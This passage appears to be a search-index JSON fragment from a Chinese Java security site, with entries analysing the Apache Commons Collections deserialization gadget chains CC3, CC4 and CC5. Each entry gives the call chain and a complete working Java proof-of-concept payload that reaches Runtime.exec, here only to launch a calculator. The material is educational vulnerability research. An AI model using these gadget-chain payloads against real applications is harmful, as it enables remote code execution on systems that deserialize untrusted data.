Class[]{Templates.class},new Object[]{templates}) }); \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u662f\u901a\u8fc7InstantiateTransformer \u66ff\u4ee3\u4e86InvokerTransformer\uff0c\u5e76\u4e14\u7528\u5230\u4e86TrAXFilter.class \u8fd9\u4e2a\u7c7b\u3002 \u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u8fd9\u4e24\u4e2a\u8d35\u7269\u3002 TrAXFilter.class \u5341\u5206\u660e\u663e\uff0cTrAXFilter\u7684\u6784\u9020\u65b9\u6cd5\u5bf9\u4f20\u5165\u7684Templates\u5bf9\u8c61\u8fdb\u884c\u4e86\u5b9e\u4f8b\u5316\u5904\u7406\uff0c\u800cTemplatesImpl\u662fTemplates\u7684\u5b50\u7c7b\uff0c\u4e8e\u662f\u4e4e\u6211\u4eec\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2aTemplatesImpl\u5bf9\u8c61\uff0c\u4f7f\u8be5\u5bf9\u8c61\u7684newTransformer\u65b9\u6cd5\u88ab\u8c03\u7528\uff0c\u4ee5\u6b64\u4fc3\u6210TemplatesImpl\u5bf9\u8c61\u4e2d_bytecodes\u4e2d\u7684\u5b57\u8282\u7801\u88ab\u5b9e\u4f8b\u5316\u6210\u4e00\u4e2a\u6076\u610f\u5bf9\u8c61\uff0c\u5e76\u8c03\u7528\u8fd9\u4e2a\u6076\u610f\u5bf9\u8c61\u7684\u6784\u9020\u65b9\u6cd5\u3002 InstantiateTransformer \u53ef\u4ee5\u53d1\u73b0transformer\u65b9\u6cd5\u4e2d\u4f1a\u83b7\u53d6\u4f20\u5165\u5bf9\u8c61\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u5e76\u4f20\u5165\u53c2\u6570\u8c03\u7528\u5176\u6784\u9020\u65b9\u6cd5\u3002 \u6211\u4eec\u8fd9\u4e2a\u5730\u65b9\u4f20\u5165TrAXFilter\u5bf9\u8c61\uff0c\u5e76\u4f20\u5165\u6076\u610f\u7684TemplatesImpl\u5bf9\u8c61\u4fbf\u53ef\u4ee5\u5728TrAXFilter\u8c03\u7528\u6784\u9020\u65b9\u6cd5\u65f6\u8c03\u7528TemplatesImpl.newInstance \u628a\u6076\u610f\u5bf9\u8c61\u4ece\u5b57\u8282\u7801\u751f\u6210\u51fa\u6765\u5e76\u8c03\u7528\u6076\u610f\u5bf9\u8c61\u7684\u6784\u9020\u65b9\u6cd5\u3002","title":"Apache-Commons-Collections 3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%203/Apache-Commons-Collections%203/#apache-commons-collections-3","text":"","title":"Apache-Commons-Collections 3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%203/Apache-Commons-Collections%203/#_1","text":"\u7248\u672c \u5229\u7528\u94fe TrAXFilter.class InstantiateTransformer CC3\u94fe\u5927\u81f4\u4e0a\u662fCC1\u548cCC2\u7684\u7f1d\u5408\uff0c\u4e2d\u95f4\u4e00\u4e9b\u7ec6\u8282\u6709\u70b9\u4e0d\u540c\uff08TrAXFilter\uff0cInstantiateTransformer\uff09 LazyMap+TrAXFilter+InstantiateTransformer+TemplatesImpl","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%203/Apache-Commons-Collections%203/#_2","text":"commons-collections-3.1-3.2.1\uff0cJDK1.7","title":"\u7248\u672c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%203/Apache-Commons-Collections%203/#_3","text":"ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() POC import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //\u8bbe\u7f6e\u7236\u7c7b\u4e3aAbstractTranslet\uff0c\u907f\u514d\u62a5\u9519 byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}) }); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain); Constructor handler_constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class, Map.class); handler_constructor.setAccessible(true); InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); Constructor AnnotationInvocationHandler_Constructor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandler_Constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc3\")); outputStream.writeObject(handler); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc3\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } \u53ef\u4ee5\u53d1\u73b0\u662fChianedTransformer+TemplatesImpl+LazyMap \u7f1d\u5408\uff0c\u4e0d\u8fc7ChianedTransformer\u5185\u90e8\u6709\u70b9\u548cCC\u94fe1\u30012\u4e0d\u540c. ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}) }); \u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u662f\u901a\u8fc7InstantiateTransformer \u66ff\u4ee3\u4e86InvokerTransformer\uff0c\u5e76\u4e14\u7528\u5230\u4e86TrAXFilter.class \u8fd9\u4e2a\u7c7b\u3002 \u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u8fd9\u4e24\u4e2a\u8d35\u7269\u3002","title":"\u5229\u7528\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%203/Apache-Commons-Collections%203/#traxfilterclass","text":"\u5341\u5206\u660e\u663e\uff0cTrAXFilter\u7684\u6784\u9020\u65b9\u6cd5\u5bf9\u4f20\u5165\u7684Templates\u5bf9\u8c61\u8fdb\u884c\u4e86\u5b9e\u4f8b\u5316\u5904\u7406\uff0c\u800cTemplatesImpl\u662fTemplates\u7684\u5b50\u7c7b\uff0c\u4e8e\u662f\u4e4e\u6211\u4eec\u53ef\u4ee5\u4f20\u5165\u4e00\u4e2aTemplatesImpl\u5bf9\u8c61\uff0c\u4f7f\u8be5\u5bf9\u8c61\u7684newTransformer\u65b9\u6cd5\u88ab\u8c03\u7528\uff0c\u4ee5\u6b64\u4fc3\u6210TemplatesImpl\u5bf9\u8c61\u4e2d_bytecodes\u4e2d\u7684\u5b57\u8282\u7801\u88ab\u5b9e\u4f8b\u5316\u6210\u4e00\u4e2a\u6076\u610f\u5bf9\u8c61\uff0c\u5e76\u8c03\u7528\u8fd9\u4e2a\u6076\u610f\u5bf9\u8c61\u7684\u6784\u9020\u65b9\u6cd5\u3002","title":"TrAXFilter.class"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%203/Apache-Commons-Collections%203/#instantiatetransformer","text":"\u53ef\u4ee5\u53d1\u73b0transformer\u65b9\u6cd5\u4e2d\u4f1a\u83b7\u53d6\u4f20\u5165\u5bf9\u8c61\u7684\u6784\u9020\u65b9\u6cd5\uff0c\u5e76\u4f20\u5165\u53c2\u6570\u8c03\u7528\u5176\u6784\u9020\u65b9\u6cd5\u3002 \u6211\u4eec\u8fd9\u4e2a\u5730\u65b9\u4f20\u5165TrAXFilter\u5bf9\u8c61\uff0c\u5e76\u4f20\u5165\u6076\u610f\u7684TemplatesImpl\u5bf9\u8c61\u4fbf\u53ef\u4ee5\u5728TrAXFilter\u8c03\u7528\u6784\u9020\u65b9\u6cd5\u65f6\u8c03\u7528TemplatesImpl.newInstance \u628a\u6076\u610f\u5bf9\u8c61\u4ece\u5b57\u8282\u7801\u751f\u6210\u51fa\u6765\u5e76\u8c03\u7528\u6076\u610f\u5bf9\u8c61\u7684\u6784\u9020\u65b9\u6cd5\u3002","title":"InstantiateTransformer&#x20;"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%204/Apache-Commons-Collections%204/","text":"Apache-Commons-Collections 4 \u76ee\u5f55 \u7248\u672c \u5229\u7528\u94fe CC2,3\u7684\u7f1d\u5408\uff0c\u7ec6\u8282\u4e0a\u6709\u4e9b\u8bb8\u5dee\u522b. PriorityQueue+TrAXFilter+InstantiateTransformer+TemplatesImpl \u7248\u672c CommonsCollections 4.0\uff0cJDK\u6682\u65e0\u9650\u5236\uff0c\u9700javassist\u4f9d\u8d56 \u5229\u7528\u94fe ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() POC import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.*; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //\u8bbe\u7f6e\u7236\u7c7b\u4e3aAbstractTranslet\uff0c\u907f\u514d\u62a5\u9519 // \u5199\u5165.class \u6587\u4ef6 byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); /** * TrAXFilter \u6784\u9020\u51fd\u6570\u80fd\u76f4\u63a5\u89e6\u53d1 \u6240\u4ee5\u4e0d\u7528\u5229\u7528 invoke \u90a3\u4e2a */ ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}) }); TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc4\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc4\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } \u5e76\u6ca1\u6709\u4ec0\u4e48\u65b0\u4e1c\u897f\uff0c\u5177\u4f53\u903b\u8f91\u4fbf\u662f\u901a\u8fc7\u8bbe\u7f6ePriorityQueue \u7684comparator\u5c5e\u6027\u4e3a\u6211\u4eec\u5b9a\u4e49\u597d\u7684ChainedTransformer \uff0c\u4f7fChainedTransformer \u7684transformer\u65b9\u6cd5\u6267\u884c\uff0c\u7ed3\u5408TrAXFilter\u4e0eInstantiateTransformer\u89e6\u53d1TemplatesImpl \u6076\u610f\u5b57\u8282\u7801\u7684\u7c7b\u751f\u6210\u5e76\u89e6\u53d1\u5176\u6784\u9020\u65b9\u6cd5\u8fbe\u5230\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002","title":"Apache-Commons-Collections 4"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%204/Apache-Commons-Collections%204/#apache-commons-collections-4","text":"","title":"Apache-Commons-Collections 4"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%204/Apache-Commons-Collections%204/#_1","text":"\u7248\u672c \u5229\u7528\u94fe CC2,3\u7684\u7f1d\u5408\uff0c\u7ec6\u8282\u4e0a\u6709\u4e9b\u8bb8\u5dee\u522b. PriorityQueue+TrAXFilter+InstantiateTransformer+TemplatesImpl","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%204/Apache-Commons-Collections%204/#_2","text":"CommonsCollections 4.0\uff0cJDK\u6682\u65e0\u9650\u5236\uff0c\u9700javassist\u4f9d\u8d56","title":"\u7248\u672c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%204/Apache-Commons-Collections%204/#_3","text":"ObjectInputStream.readObject() PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() ChainedTransformer.transform() ConstantTransformer.transform() InstantiateTransformer.transform() newInstance() TrAXFilter#TrAXFilter() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses newInstance() Runtime.exec() POC import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javassist.*; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class Main { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\");\"; // \u521b\u5efa static \u4ee3\u7801\u5757\uff0c\u5e76\u63d2\u5165\u4ee3\u7801 cc.makeClassInitializer().insertBefore(cmd); String randomClassName = \"EvilCat\" + System.nanoTime(); cc.setName(randomClassName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //\u8bbe\u7f6e\u7236\u7c7b\u4e3aAbstractTranslet\uff0c\u907f\u514d\u62a5\u9519 // \u5199\u5165.class \u6587\u4ef6 byte[] classBytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", targetByteCodes); // \u8fdb\u5165 defineTransletClasses() \u65b9\u6cd5\u9700\u8981\u7684\u6761\u4ef6 setFieldValue(templates, \"_name\", \"name\"); setFieldValue(templates, \"_class\", null); /** * TrAXFilter \u6784\u9020\u51fd\u6570\u80fd\u76f4\u63a5\u89e6\u53d1 \u6240\u4ee5\u4e0d\u7528\u5229\u7528 invoke \u90a3\u4e2a */ ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}) }); TransformingComparator comparator = new TransformingComparator(chain); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(2); Field comparator_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); comparator_field.setAccessible(true); comparator_field.set(queue,comparator); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc4\")); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc4\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { final Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField(final Class<?> clazz, final String fieldName) { Field field = null; try { field = clazz.getDeclaredField(fieldName); field.setAccessible(true); } catch (NoSuchFieldException ex) { if (clazz.getSuperclass() != null) field = getField(clazz.getSuperclass(), fieldName); } return field; } } \u5e76\u6ca1\u6709\u4ec0\u4e48\u65b0\u4e1c\u897f\uff0c\u5177\u4f53\u903b\u8f91\u4fbf\u662f\u901a\u8fc7\u8bbe\u7f6ePriorityQueue \u7684comparator\u5c5e\u6027\u4e3a\u6211\u4eec\u5b9a\u4e49\u597d\u7684ChainedTransformer \uff0c\u4f7fChainedTransformer \u7684transformer\u65b9\u6cd5\u6267\u884c\uff0c\u7ed3\u5408TrAXFilter\u4e0eInstantiateTransformer\u89e6\u53d1TemplatesImpl \u6076\u610f\u5b57\u8282\u7801\u7684\u7c7b\u751f\u6210\u5e76\u89e6\u53d1\u5176\u6784\u9020\u65b9\u6cd5\u8fbe\u5230\u547d\u4ee4\u6267\u884c\u7684\u76ee\u7684\u3002","title":"\u5229\u7528\u94fe"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%205/Apache-Commons-Collections%205/","text":"Apache-Commons-Collections 5 \u76ee\u5f55 \u7248\u672c \u5229\u7528\u94fe TiedMapEntry BadAttributeValueExpException LazyMap+TideMap+BadAttributeValueExpException \u7248\u672c CommonsCollections 3.1 - 3.2.1\uff0cJDK 7u80 \u4ee5\u4e0a\uff08\u4f4e\u4e8e7u80\u7684BadAttributeValueExpException \u65e0readObject\u65b9\u6cd5\uff09 \u5229\u7528\u94fe \u8c03\u8bd5\u8be5\u94fe\u65f6\uff0c\u56e0\u4e3a\u6d89\u53catoString\u51fd\u6570\u8c03\u7528\uff0c\u6240\u4ee5idea\u8c03\u8bd5\u8bf7\u5173\u95ed\u6b64\u4fe9\u9009\u9879 ObjectInputStream.readObject() BadAttributeValueExpException.readObject() TiedMapEntry.toString() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() POC import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.keyvalue.TiedMapEntry; import javax.management.BadAttributeValueExpException; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; public class cc5 { public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException { ChainedTransformer chain = new ChainedTransformer(new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[] { String.class, Class[].class }, new Object[] { \"getRuntime\", new Class[0] }), new InvokerTransformer(\"invoke\", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\"exec\", new Class[] { String.class }, new Object[]{\"open /System/Applications/Calculator.app\"})}); HashMap innermap = new HashMap(); LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain); TiedMapEntry tiedmap = new TiedMapEntry(map,123); BadAttributeValueExpException poc = new BadAttributeValueExpException(1); Field val = Class.forName(\"javax.management.BadAttributeValueExpException\").getDeclaredField(\"val\"); val.setAccessible(true); val.set(poc,tiedmap); try{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc5\")); outputStream.writeObject(poc); outputStream.close(); ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(\"./cc5\")); inputStream.readObject(); }catch(Exception e){ e.printStackTrace(); } } } \u524d\u534a\u90e8\u5206\u548cCC1\u4e00\u6837\uff0c\u540e\u534a\u90e8\u5206\u5f15\u5165\u4e86TiedMapEntry \u548cBadAttributeValueExpException \uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u8fd9\u4fe9\u4e1c\u897f\u3002 TiedMapEntry \u9996\u5148\u6211\u4eec\u5728CC1\u4e2d\u5df2\u7ecf\u77e5\u9053\u4e86LazyMap\u7684get\u65b9\u6cd5\u4f1a\u89e6\u53d1\u5176\u5728decorate\u4e2d\u4f20\u5165\u7684Transfromer\u7c7b\u7684transform\u65b9\u6cd5\u3002 \u5728TiedMapEntry\u7c7b\u4e2d\u5b58\u5728\u65b9\u6cd5getValue\uff0c\u4f1a\u8c03\u7528\u5728\u6784\u9020\u51fd\u6570\u4e2d\u4f20\u5165\u7684map\u7684get\u65b9\u6cd5 \u800c\u4e14\u5728TiedMapEntry\u7c7b\u4e2d\u540c\u65f6\u4e5f\u5b58\u5728\u65b9\u6cd5toString\u4f1a\u8c03\u7528getValue\u65b9\u6cd5 BadAttributeValueExpException \u8be5\u7c7b\u7684readObject\u65b9\u6cd5\u5982\u4e0b \u8fd9\u91cc\u4f1a\u8c03\u7528toString\u65b9\u6cd5\uff0c\u7136\u540e\u8fdb\u5165TideMapEntry\u5f00\u59cb\u94fe\u7684\u6267\u884c\u3002 \u8fd9\u91ccvalObj\u5c31\u662fval\u53d8\u91cf\u7684\u503c\u3002 Field val = Class.forName(\"javax.management.BadAttributeValueExpException\").getDeclaredField(\"val\"); val.setAccessible(true); val.set(poc,tiedmap); \u6240\u4ee5\u6211\u4eec\u5728POC\u4e2d\u7528\u53cd\u5c04\u5c06val\u53d8\u91cf\u8fdb\u884c\u4e86\u8d4b\u503c\uff0c\u8d4b\u7684\u503c\u662f\u6076\u610fTiedMapEntry \u5bf9\u8c61\u3002 \u8fd9\u91cc\u6709\u4e00\u4e2a\u7ec6\u8282\u5c31\u662f\uff0cval\u53d8\u91cf\u662f\u53ef\u4ee5\u901a\u8fc7\u6784\u9020\u51fd\u6570\u8d4b\u503c\u7684\u3002 \u4f46\u662f\u5982\u679c\u7528\u6784\u9020\u51fd\u6570\u76f4\u63a5\u7ed9val\u8d4b\u503c\u7684\u8bdd\uff0c\u4f1a\u5bfc\u81f4val\u5728\u8d4b\u503c\u7684\u65f6\u5019\u4fbf\u89e6\u53d1toString,\u5bfc\u81f4\u5728\u53cd\u5e8f\u5217\u5316\u65f6\uff0cvalObject\u7684\u503c\u6539\u53d8\uff0c\u5bfc\u81f4\u539f\u672c\u9884\u671f\u7684\u903b\u8f91\u6539\u53d8\uff0c\u65e0\u6cd5\u8fdb\u5165\u9884\u60f3\u7684\u5206\u652f\u3002 \u8fd9\u662f\u9884\u671f\u7684\u60c5\u51b5\uff08\u901a\u8fc7\u540e\u671f\u53cd\u5c04\u8d4b\u503cval\uff09 \u8fd9\u662f\u975e\u9884\u671f\u60c5\u51b5\uff08\u901a\u8fc7\u6784\u9020\u51fd\u6570\u76f4\u63a5\u7ed9val\u8d4b\u503c\uff0c\u8fd9\u91cc\u7684val\u503c\u76f4\u63a5\u53d8\u6210\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u4e0d\u8981\u4ee5\u4e3a\u662fProcessImpl\u5bf9\u8c61\uff01\u6ce8\u610f\u5f15\u53f7\uff01\uff09","title":"Apache-Commons-Collections 5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%205/Apache-Commons-Collections%205/#apache-commons-collections-5","text":"","title":"Apache-Commons-Collections 5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%205/Apache-Commons-Collections%205/#_1","text":"\u7248\u672c \u5229\u7528\u94fe TiedMapEntry BadAttributeValueExpException LazyMap+TideMap+BadAttributeValueExpException","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/CC%E9%93%BE%E5%88%86%E6%9E%90/Apache-Commons-Collections%205/Apache-Commons-Collections%205/#_2","text":"CommonsCollections 3.1 - 3.2.1\uff0cJDK 7u80 \u4ee5\u4e0a\uff08\u4f4e\u4e8e7u80\u7684BadAttributeValueExpException 